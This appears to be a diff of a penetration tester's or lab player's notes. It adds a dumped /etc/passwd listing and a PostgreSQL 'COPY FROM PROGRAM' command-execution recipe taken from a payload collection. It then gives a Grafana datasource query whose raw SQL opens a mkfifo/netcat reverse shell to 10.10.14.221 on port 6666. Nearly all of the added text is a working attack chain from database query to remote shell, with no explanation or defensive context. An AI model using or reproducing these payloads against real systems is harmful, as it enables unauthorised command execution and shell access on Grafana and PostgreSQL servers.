@@ -86,3 +86,14 @@ postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
 grafana:x:115:121::/usr/share/grafana:/bin/false
 jovian:x:1001:1002:,,,:/home/jovian:/bin/bash
 _laurel:x:998:998::/var/log/laurel:/bin/false
+
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution
+
+DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists
+CREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output
+COPY cmd_exec FROM PROGRAM 'id';        -- Run the system command via the COPY FROM PROGRAM function
+SELECT * FROM cmd_exec;                 -- [Optional] View the results
+DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table
+
+{"queries":[{"refId":"A","datasource":{"type":"postgres","uid":"YItSLg-Vz"},"rawSql":"DROP TABLE IF EXISTS cmd_exec;   CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.221 6666 >/tmp/f'; SELECT * FROM cmd_exec;","format":"table","datasourceId":1,"intervalMs":60000,"maxDataPoints":386}],"range":{"from":"2023-10-21T04:58:39.945Z","to":"2023-10-21T10:58:39.945Z","raw":{"from":"now-6h","to":"now"}},"from":"1697864319945","to":"1697885919945"}
